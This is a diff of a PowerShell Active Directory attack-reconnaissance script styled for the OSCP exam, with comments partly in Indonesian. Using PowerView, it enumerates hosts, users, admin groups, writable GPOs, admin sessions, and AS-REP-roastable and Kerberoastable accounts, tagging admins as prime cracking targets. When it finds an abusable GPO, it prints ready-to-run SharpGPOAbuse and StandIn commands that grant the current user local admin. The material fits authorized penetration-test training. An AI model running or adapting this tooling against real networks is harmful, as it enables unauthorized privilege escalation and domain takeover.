@@ -1,9 +1,8 @@
-# ===============================
-# AD ENUM REPORT (OSCP STYLE - FINAL)
+# =============================================================
+# AD ENUM REPORT (OSCP STYLE - ULTIMATE ASSEMBLY)
 # powershell -NoProfile -ExecutionPolicy Bypass -File ./adenum.ps1
-# Prerequisite: PowerView.ps1 dan PsLoggedon64.exe
-# Note: Sharphound and Bloodhound to analyze shortest path to Domain Admin (Separate Tools)
-# ===============================
+# Prerequisite: PowerView.ps1 & PsLoggedon64.exe
+# =============================================================
 
 $outfile = "$env:USERPROFILE\ad_enum_report.txt"
 Remove-Item $outfile -ErrorAction SilentlyContinue
@@ -27,30 +26,21 @@ if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
     }
 }
 
-# ===============================
-# GET DOMAIN (biar konsisten format user@domain)
-# ===============================
-$domain = (Get-Domain).Name
+# Pre-fetch domain data untuk efisiensi
+$domainObj = Get-Domain
+$domainName = $domainObj.Name
+$dnsRoot = $domainObj.dnsroot
 
 # ===============================
 # 1. HOSTS
 # ===============================
 write-section "HOSTS"
-
-$hosts = Get-DomainComputer
-
-if ($hosts.Count -eq 0) {
-    Add-Content $outfile "Null"
-} else {
-    $hosts | ForEach-Object {
+$hosts = Get-DomainComputer -Properties dnshostname, OperatingSystem
+if ($hosts) {
+    foreach ($h in $hosts) {
         $ip = ""
-        try {
-            $ip = ([System.Net.Dns]::GetHostAddresses($_.dnshostname) |
-            Where-Object {$_.AddressFamily -eq "InterNetwork"} |
-            Select -First 1).IPAddressToString
-        } catch {}
-
-        "$($_.dnshostname);$($_.OperatingSystem);$ip" | Add-Content $outfile
+        try { $ip = ([System.Net.Dns]::GetHostAddresses($h.dnshostname) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | Select -First 1).IPAddressToString } catch {}
+        "$($h.dnshostname);$($h.OperatingSystem);$ip" | Add-Content $outfile
     }
 }
 
@@ -58,49 +48,25 @@ if ($hosts.Count -eq 0) {
 # 2. USERS
 # ===============================
 write-section "USERS"
+Get-DomainUser -Properties samaccountname | ForEach-Object { "$($_.samaccountname)@$domainName" } | Add-Content $outfile
 
-$users = Get-DomainUser
-
-if ($users.Count -eq 0) {
-    Add-Content $outfile "Null"
-} else {
-    $users | ForEach-Object {
-        "$($_.samaccountname)@$domain" | Add-Content $outfile
-    }
-}
-
-# =============================================================
-# 3. ADMIN GROUP MEMBERS 
-# =============================================================
+# ===============================
+# 3. ADMIN GROUP MEMBERS (RECURSIVE)
+# ===============================
 write-section "ADMIN GROUP MEMBERS (BLOODHOUND STYLE)"
-
 $currentSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
 $currentUser = whoami
-
-# Definisikan target grup yang krusial
 $targetGroups = @("Domain Admins", "Administrators", "Enterprise Admins")
-$allAdmins = @() # Inisialisasi variabel global untuk dipakai di Script 6 nanti
+$allAdmins = @()
 
 foreach ($groupName in $targetGroups) {
-    # Ambil member secara mendalam (Recurse)
     $admins = Get-DomainGroupMember -Identity $groupName -Recurse -ErrorAction SilentlyContinue
-
     if ($admins) {
-        $allAdmins += $admins # Simpan ke variabel global
+        $allAdmins += $admins
         Add-Content $outfile "--- Group: $groupName ---"
-        
-        $admins | ForEach-Object {
-            $name = $_.MemberName
-            $sid  = $_.MemberSID
-            $type = $_.ObjectClass 
-
-            $line = "$name ($type);$sid"
-
-            # Highlight jika itu akun kamu sendiri
-            if ($sid -eq $currentSID -or $name -match $currentUser) {
-                $line = "[CURRENT ADMIN] $line"
-            }
-
+        foreach ($a in $admins) {
+            $line = "$($a.MemberName) ($($a.ObjectClass));$($a.MemberSID)"
+            if ($a.MemberSID -eq $currentSID -or $a.MemberName -match $currentUser) { $line = "[CURRENT ADMIN] $line" }
             Add-Content $outfile $line
         }
     }
@@ -110,305 +76,146 @@ foreach ($groupName in $targetGroups) {
 # 4. RELEVANT GROUPS (FILTERED)
 # ===============================
 write-section "RELEVANT GROUPS"
-
-# Daftar kata kunci grup yang biasanya punya celah atau akses tinggi
-$valuableKeywords = @("Admin", "Remote", "Desktop", "SQL", "Backup", "GPO", "Exchange", "SharePoint", "VPN", "IT", "Dev")
-
-$groups = Get-DomainGroup -Properties Name, Description
-
-if ($groups.Count -eq 0) {
-    Add-Content $outfile "Null"
-} else {
-    foreach ($g in $groups) {
-        # Hanya ambil yang namanya cocok dengan kata kunci di atas
-        foreach ($key in $valuableKeywords) {
-            if ($g.Name -match $key) {
-                $line = "$($g.Name) -- Description: $($g.Description)"
-                Add-Content $outfile $line
-                break # Pindah ke grup berikutnya kalau sudah ketemu satu match
-            }
-        }
-    }
+$valuableKeywords = "Admin|Remote|Desktop|SQL|Backup|GPO|Exchange|SharePoint|VPN|IT|Dev"
+Get-DomainGroup -Properties Name, Description | Where-Object { $_.Name -match $valuableKeywords } | ForEach-Object {
+    "$($_.Name) -- Description: $($_.Description)" | Add-Content $outfile
 }
 
 # ===============================
-# 5. GPO (ENUM + PRIVILEGE CHECK)
+# 5. GPO EXPLOITABILITY (SharpGPOAbuse Ready)
 # ===============================
-write-section "GPO"
-
+write-section "GPO EXPLOITABILITY"
 $gpos = Get-DomainGPO
-
-if ($gpos.Count -eq 0) {
-    Add-Content $outfile "Null"
-}
-else {
-    $gpos | Select-Object -ExpandProperty displayname | Add-Content $outfile
-}
-
 $me = whoami
-$gpos = Get-DomainGPO
-
-if ($gpos.Count -eq 0) {
-    Add-Content $outfile "Null"
-    return
-}
-
-Add-Content $outfile "`n[+] Current User: $me"
-Add-Content $outfile "`n[+] GPO Enumeration + Privilege Mapping:`n"
-
-$domain = Get-DomainObject -SearchScope Base
-$domainLinks = $domain.gplink
-
-$ous = Get-DomainOU
-$sites = Get-DomainSite
-
 $foundExploit = $false
+$exploitableGPONames = @() # Untuk menampung nama GPO yang kena hit
 
-foreach ($gpo in $gpos) {
+if ($gpos) {
+    $domainLinks = (Get-DomainObject -SearchScope Base).gplink
+    $ous = Get-DomainOU
+    $sites = Get-DomainSite
 
-    $acls = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs | Where-Object {
-        $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner"
-    }
-
-    foreach ($acl in $acls) {
-
-        try {
-            $identity = ConvertFrom-SID $acl.SecurityIdentifier
-        } catch {
-            continue
+    foreach ($gpo in $gpos) {
+        $acls = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs | Where-Object {
+            $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner"
         }
+        foreach ($acl in $acls) {
+            $identity = ""
+            try { $identity = ConvertFrom-SID $acl.SecurityIdentifier } catch { continue }
+            if ($identity -ne $me) { continue }
 
-        if ($identity -ne $me) { continue }
+            $scope = @()
+            if ($domainLinks -like "*$($gpo.name)*") { $scope += "Domain" }
+            foreach ($ou in $ous) { if ($ou.gplink -like "*$($gpo.name)*") { $scope += "OU:$($ou.name)" } }
+            foreach ($site in $sites) { if ($site.gplink -like "*$($gpo.name)*") { $scope += "Site:$($site.name)" } }
+            $scopeStr = if ($scope.Count -eq 0) { "Not Linked" } else { $scope -join "," }
 
-        # ===============================
-        # Scope detection
-        # ===============================
-        $scope = @()
+            $foundExploit = $true
+            $exploitableGPONames += $gpo.displayname # Simpan nama GPO
 
-        if ($domainLinks -like "*$($gpo.name)*") {
-            $scope += "Domain"
+            Add-Content $outfile "------------------------------------"
+            Add-Content $outfile "[!] EXPLOITABLE GPO FOUND"
+            Add-Content $outfile "User    : $identity"
+            Add-Content $outfile "GPO     : $($gpo.displayname)"
+            Add-Content $outfile "Rights  : $($acl.ActiveDirectoryRights)"
+            Add-Content $outfile "Scope   : $scopeStr"
+            Add-Content $outfile "------------------------------------"
         }
-
-        foreach ($ou in $ous) {
-            if ($ou.gplink -like "*$($gpo.name)*") {
-                $scope += "OU:$($ou.name)"
-            }
-        }
-
-        foreach ($site in $sites) {
-            if ($site.gplink -like "*$($gpo.name)*") {
-                $scope += "Site:$($site.name)"
-            }
-        }
-
-        if ($scope.Count -eq 0) { $scope = "Unknown" } else { $scope = $scope -join "," }
-
-        # ===============================
-        # Decide exploitability
-        # ===============================
-        $impact = ""
-        if ($scope -match "Domain") {
-            $impact = "HIGH (Domain-wide takeover possible)"
-        } elseif ($scope -match "OU") {
-            $impact = "MEDIUM (Lateral movement possible)"
-        } else {
-            $impact = "LOW/UNKNOWN"
-        }
-
-        $foundExploit = $true
-
-        # ===============================
-        # OUTPUT
-        # ===============================
-        Add-Content $outfile "------------------------------------"
-        Add-Content $outfile "[!] EXPLOITABLE GPO FOUND"
-        Add-Content $outfile "User    : $identity"
-        Add-Content $outfile "GPO     : $($gpo.displayname)"
-        Add-Content $outfile "Rights  : $($acl.ActiveDirectoryRights)"
-        Add-Content $outfile "Scope   : $scope"
-        Add-Content $outfile "Impact  : $impact"
-        Add-Content $outfile "------------------------------------"
-        Add-Content $outfile ""
     }
 }
 
-# ===============================
-# Summary
-# ===============================
-if (-not $foundExploit) {
-    Add-Content $outfile "[+] No exploitable GPO rights found for current user"
-} else {
-    Add-Content $outfile "Choose attack method"
+# Blok instruksi ini HANYA akan diprint jika $foundExploit bernilai $true
+if ($foundExploit) {
+    Add-Content $outfile "`n[!] ATTACK RECOMMENDATION [!]"
+    Add-Content $outfile "Choose attack method for the discovered GPOs:"
     
-    Add-Content $outfile "   Option A - SharpGPOAbuse"
-    Add-Content $outfile "   Example:"
-    Add-Content $outfile "   SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName <TARGET_GPO>"
-    Add-Content $outfile "   → Result: user becomes local admin on all linked machines"
-    
-    Add-Content $outfile ""
-    Add-Content $outfile "   Option B - StandIn (enumeration + modification)"
-    Add-Content $outfile "   - List GPOs:"
-    Add-Content $outfile "     StandIn.exe --gpo"
-    Add-Content $outfile "   - Check ACL:"
-    Add-Content $outfile "     StandIn.exe --gpo --filter <GPO_NAME> --acl"
-    Add-Content $outfile "   - Abuse:"
-    Add-Content $outfile "     StandIn.exe --gpo --filter <GPO_NAME> --localadmin $me"
-
-}
-
-# =============================================================
-# 6. BLOODHOUND-LIKE (ACTIONABLE QUERIES)
-# =============================================================
-
-write-section "LOCAL ADMIN ACCESS (Where can I go?)"
-# Mencari di mana akun kamu saat ini punya hak Local Admin secara langsung
-try {
-    Find-LocalAdminAccess -ErrorAction SilentlyContinue | ForEach-Object {
-        $line = "[+] LOCAL ADMIN ACCESS FOUND: $_"
-        Add-Content $outfile $line
-    }
-} catch { }
-
-write-section "REMOTE DESKTOP USERS (RDP Access)"
-# Mencari komputer mana yang membolehkan 'Domain Users' login via RDP
-$allComputers = Get-DomainComputer -Properties Name -ErrorAction SilentlyContinue
-foreach ($comp in $allComputers.Name) {
-    try {
-        $rdpMembers = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Remote Desktop Users" -ErrorAction Stop
-        foreach ($member in $rdpMembers) {
-            # BloodHound Logic: Jika Domain Users bisa RDP, itu celah besar
-            if ($member.MemberName -match "Domain Users") {
-                $line = "[!] RDP RISK: 'Domain Users' group can RDP to $comp"
-                Add-Content $outfile $line
-            }
-        }
-    } catch { }
-}
-
-write-section "DOMAIN USERS AS LOCAL ADMIN"
-# Cek miskonfigurasi: Apakah Domain Users dimasukkan ke grup Administrators lokal?
-foreach ($comp in $allComputers.Name) {
-    try {
-        $localAdmins = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Administrators" -ErrorAction Stop
-        foreach ($admin in $localAdmins) {
-            if ($admin.MemberName -match "Domain Users") {
-                $line = "[!!!] CRITICAL: 'Domain Users' is Local Admin on $comp"
-                Add-Content $outfile $line
-            }
-        }
-    } catch { continue }
-}
-
-write-section "SHORTEST PATH - SESSIONS (Hunting Admins)"
-if ($allAdmins) {
-    $uniqueAdminNames = $allAdmins.MemberName | Select-Object -Unique
-    
-    foreach ($adminName in $uniqueAdminNames) {
-        # FIX: Pakai Get-NetSession lalu filter manual supaya tidak error parameter
-        $sessions = Get-NetSession -ErrorAction SilentlyContinue | Where-Object { $_.UserName -match $adminName }
+    foreach ($targetGPO in ($exploitableGPONames | Select-Object -Unique)) {
+        Add-Content $outfile "`n>>> Target: $targetGPO"
         
-        if ($sessions) {
-            foreach ($s in $sessions) {
-                $line = "[*] PATH: Admin [$adminName] is logged into [$($s.ComputerName)]"
-                Add-Content $outfile $line
-            }
+        Add-Content $outfile "    Option A - SharpGPOAbuse"
+        Add-Content $outfile "    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName '$targetGPO'"
+        
+        Add-Content $outfile "    Option B - StandIn"
+        Add-Content $outfile "    StandIn.exe --gpo --filter '$targetGPO' --localadmin $me"
+    }
+} else {
+    Add-Content $outfile "[+] No exploitable GPO rights found for current user"
+}
+
+# ===============================
+# 6. ACTIONABLE QUERIES (OPTIMIZED SESSION HUNTING)
+# ===============================
+write-section "LATERAL MOVEMENT & SESSIONS"
+
+# Find Local Admin Access
+Find-LocalAdminAccess -ErrorAction SilentlyContinue | ForEach-Object { Add-Content $outfile "[+] LOCAL ADMIN ACCESS FOUND: $_" }
+
+# Optimized Session Hunting (Fetch all sessions ONCE)
+$allSessions = Get-NetSession -ErrorAction SilentlyContinue
+if ($allAdmins -and $allSessions) {
+    $uniqueAdminNames = $allAdmins.MemberName | Select-Object -Unique
+    foreach ($adminName in $uniqueAdminNames) {
+        $allSessions | Where-Object { $_.UserName -match $adminName } | ForEach-Object {
+            Add-Content $outfile "[*] PATH: Admin [$adminName] is logged into [$($_.ComputerName)]"
         }
     }
 }
 
-
-# ===============================
-# 7. ACTIVE SESSIONS (PsLoggedon)
-# ===============================
-write-section "ACTIVE SESSIONS"
-
-$results = @()
-
-try {
-    $targets = Get-DomainComputer | Select -ExpandProperty dnshostname
-} catch {
-    $targets = @()
-}
-
-foreach ($target in $targets) {
-
-    $tmp = "$env:TEMP\pslog_$target.txt"
-
+# RDP Risk & Domain Users as Local Admin
+$allComputers = $hosts.dnshostname
+foreach ($comp in $allComputers) {
     try {
-        # Run via CMD + redirect output (anti hang)
-        cmd /c "PsLoggedon64.exe \\$target -accepteula > $tmp 2>&1"
-
-        if (Test-Path $tmp) {
-
-            $content = Get-Content $tmp
-
-            foreach ($line in $content) {
-            
-                if ($line -match "\\" -and $line -notmatch "Users logged on") {
-            
-                    $clean = $line.Trim()
-                    $short = $target.Split('.')[0]
-            
-                    $results += "$short;$clean"
-                }
-            }
-
-            Remove-Item $tmp -ErrorAction SilentlyContinue
-        }
-
+        $rdp = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Remote Desktop Users" -ErrorAction SilentlyContinue
+        if ($rdp.MemberName -match "Domain Users") { Add-Content $outfile "[!] RDP RISK: 'Domain Users' can RDP to $comp" }
+        
+        $localAdmins = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Administrators" -ErrorAction SilentlyContinue
+        if ($localAdmins.MemberName -match "Domain Users") { Add-Content $outfile "[!!!] CRITICAL: 'Domain Users' is Local Admin on $comp" }
     } catch {}
 }
 
-if ($results.Count -eq 0) {
-    Add-Content $outfile "Null"
-} else {
-    $results | Sort-Object -Unique | Add-Content $outfile
-}
+# ===============================
+# 7. AS-REP ROASTING
+# ===============================
+write-section "AS-REP ROASTABLE USERS"
+$asrep = Get-DomainUser -PreauthNotRequired -ErrorAction SilentlyContinue
+if ($asrep) {
+    $asrep | ForEach-Object { Add-Content $outfile "[!!!] AS-REP ROASTABLE: $($_.samaccountname) (No Pre-Auth Required!)" }
+} else { Add-Content $outfile "Null" }
 
-# =============================================================
-# 8. KERBEROASTABLE USERS (FULL LIST + RELEVANCE HIGHLIGHT)
-# =============================================================
+# ===============================
+# 8. KERBEROASTABLE USERS
+# ===============================
 write-section "KERBEROASTABLE USERS"
-
 $spnUsers = Get-DomainUser -SPN -ErrorAction SilentlyContinue
-$domainName = (Get-Domain).dnsroot
-
-# List akun sistem untuk label saja, bukan untuk di-hide
-$noiseAccounts = @("krbtgt", "kadmin")
-
-if ($spnUsers.Count -eq 0) {
-    Add-Content $outfile "Null"
-} else {
+$noise = @("krbtgt", "kadmin")
+if ($spnUsers) {
     foreach ($u in $spnUsers) {
         $sam = $u.samaccountname
-        $service = $u.serviceprincipalname
-        
-        $tag = ""
-        $color = "Gray"
-
-        # 1. KASTA TERTINGGI: Admin (Data dari Script 3/9)
-        if ($allAdmins.MemberName -contains $sam) {
-            $tag = "[!!! ADMIN - JACKPOT !!!] "
-            $color = "Red"
-        } 
-        # 2. KASTA SISTEM: Noise (Tetap muncul tapi ditandai)
-        elseif ($noiseAccounts -contains $sam.ToLower()) {
-            $tag = "[SYSTEM/NOISE] "
-            $color = "DarkGray"
-        }
-        # 3. KASTA POTENSIAL: User Biasa (Target paling 'manusiawi' buat di-crack)
-        else {
-            $tag = "[USER ACCOUNT - RELEVANT] "
-            $color = "Cyan"
-        }
-
-        $line = "$tag$sam@$domainName;$service"
-        Add-Content $outfile $line
+        $tag = if ($allAdmins.MemberName -contains $sam) { "[!!! ADMIN !!!] " } elseif ($noise -contains $sam.ToLower()) { "[SYSTEM] " } else { "[USER ACCOUNT] " }
+        Add-Content $outfile "$tag$sam@$dnsRoot;$($u.serviceprincipalname)"
     }
 }
+
+# ===============================
+# 9. ACTIVE SESSIONS (PsLoggedon)
+# ===============================
+write-section "ACTIVE SESSIONS (PSLOGGEDON)"
+$results = @()
+foreach ($target in $allComputers) {
+    $tmp = "$env:TEMP\pslog_$target.txt"
+    try {
+        cmd /c "PsLoggedon64.exe \\$target -accepteula > $tmp 2>&1"
+        if (Test-Path $tmp) {
+            Get-Content $tmp | Where-Object { $_ -match "\\" -and $_ -notmatch "Users logged on" } | ForEach-Object {
+                $results += "$($target.Split('.')[0]);$($_.Trim())"
+            }
+            Remove-Item $tmp -ErrorAction SilentlyContinue
+        }
+    } catch {}
+}
+if ($results) { $results | Sort-Object -Unique | Add-Content $outfile } else { Add-Content $outfile "Null" }
 
 # ===============================
 # DONE
 # ===============================
-Write-Host "[+] DONE!"
-Write-Host "[+] Report saved to: $outfile"
+Write-Host "[+] DONE! Report saved to: $outfile"
